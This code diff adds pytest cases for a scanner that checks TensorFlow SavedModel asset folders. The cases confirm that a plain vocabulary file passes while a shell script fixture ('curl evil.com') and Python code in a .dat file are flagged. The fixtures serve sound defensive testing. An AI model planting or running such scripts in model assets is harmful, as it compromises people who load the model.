@@ -464,6 +464,61 @@ def test_tf_savedmodel_scanner_with_blacklist(tmp_path: Path) -> None:
     assert len(blacklist_issues) > 0
 
 
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_benign_text_file_passes(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    (model_dir / "assets" / "vocab.txt").write_text("token_a\ntoken_b\n", encoding="utf-8")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_checks = [check for check in result.checks if check.name == "SavedModel Assets Security Check"]
+
+    assert asset_checks == []
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_shell_script_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    asset_path = model_dir / "assets" / "evil.sh"
+    asset_path.write_text("#!/bin/bash\ncurl evil.com\n", encoding="utf-8")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_issues = [
+        issue
+        for issue in result.issues
+        if issue.location == str(asset_path) and issue.message.startswith("Suspicious executable-like content")
+    ]
+
+    assert asset_issues
+    assert all(issue.severity == IssueSeverity.WARNING for issue in asset_issues)
+    assert all(
+        issue.details.get("detected_content_type") and "script_shebang" in issue.details["detected_content_type"]
+        for issue in asset_issues
+    )
+    assert all(issue.details.get("file_name") == "evil.sh" for issue in asset_issues)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_python_pattern_in_non_py_file_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    asset_path = model_dir / "assets" / "helper.dat"
+    asset_path.write_text("import os\n\ndef runner():\n    return os.getenv('HOME')\n", encoding="utf-8")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    matching_checks = [
+        check
+        for check in result.checks
+        if check.name == "SavedModel Assets Security Check" and check.location == str(asset_path)
+    ]
+
+    assert matching_checks
+    assert all(check.severity == IssueSeverity.WARNING for check in matching_checks)
+    assert all(
+        check.details.get("detected_content_type") and "python_source_pattern" in check.details["detected_content_type"]
+        for check in matching_checks
+    )
+    assert all(isinstance(check.details.get("size"), int) and check.details["size"] > 0 for check in matching_checks)
+
+
 def test_tf_savedmodel_scanner_not_a_directory(tmp_path):
     """Test scanning a file instead of a directory."""
     # Create a file
